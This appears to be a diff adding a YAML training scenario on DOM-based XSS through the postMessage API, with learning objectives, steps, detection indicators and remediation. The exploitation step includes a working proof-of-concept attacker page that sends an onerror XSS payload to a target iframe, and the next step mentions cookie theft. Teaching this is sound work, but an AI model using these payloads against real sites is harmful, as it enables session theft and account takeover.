@@ -1,0 +1,103 @@
+# Category: DOM-based Vulnerabilities
+name: "DOM XSS using web messages"
+id: "dom-xss-web-messages-001"
+category: "dom_based"
+subcategory: "web_messages"
+difficulty: "practitioner"
+estimated_time: "45 minutes"
+
+description: |
+  This scenario covers DOM-based XSS through the HTML5 postMessage API. The
+  application listens for messages from other windows/frames and processes
+  the data without proper validation. An attacker can create a malicious
+  page that sends a crafted message to the vulnerable page, triggering XSS.
+
+learning_objectives:
+  - Understand the postMessage API and its security implications
+  - Identify message event listeners without origin validation
+  - Craft a malicious message to trigger XSS
+  - Exploit cross-origin communication vulnerabilities
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+  - Basic HTML/JavaScript
+
+prerequisites:
+  - Target page has a message event listener
+  - The listener uses data from the message in a dangerous sink
+  - No origin validation or weak validation
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify message event listeners"
+    commands:
+      - "# Use browser console to find event listeners:"
+      - "getEventListeners(window)"
+      - "# Look for 'message' event handlers"
+      - "# Examine how the data is used"
+    expected_output: "Message event listener identified that uses data in dangerous sink"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Create a malicious page that sends a crafted message"
+    commands:
+      - "# HTML page with iframe to target:"
+      - "<iframe src='https://target.com/vulnerable-page' id='target'></iframe>"
+      - "<script>"
+      - "  let iframe = document.getElementById('target');"
+      - "  iframe.onload = function() {"
+      - "    iframe.contentWindow.postMessage('<img src=x onerror=alert(\"XSS\")>', '*');"
+      - "  }"
+      - "</script>"
+    expected_output: "When victim loads the malicious page, the message triggers XSS"
+    detection: "Web server logs may show the message payload"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Escalate to steal data or perform actions"
+    commands:
+      - "# Use the XSS to steal cookies or perform CSRF"
+    expected_output: "Victim's data stolen or actions performed"
+    detection: "Attacker server logs show stolen data"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests with postMessage payloads"
+  log_indicators:
+    - "Cross-origin communication events"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Always validate the event.origin against a whitelist"
+    - "Do not trust data from postMessage without sanitization"
+  long_term:
+    - "Use structured cloning for safe data transfer"
+    - "Implement strict CSP to reduce impact"
+
+variables:
+  target_url: "https://target.com/vulnerable-page"
+  xss_payload: "<img src=x onerror=alert('XSS')>"
+
+assessment_questions:
+  - "What is the postMessage API and how is it used?"
+  - "Why is it important to validate event.origin?"
+  - "What is the difference between postMessage and other communication methods?"
+
+references:
+  - url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage"
+    title: "MDN postMessage"
+  - url: "https://portswigger.net/web-security/dom-based/xss-using-web-messages"
+    title: "PortSwigger Web Messages"
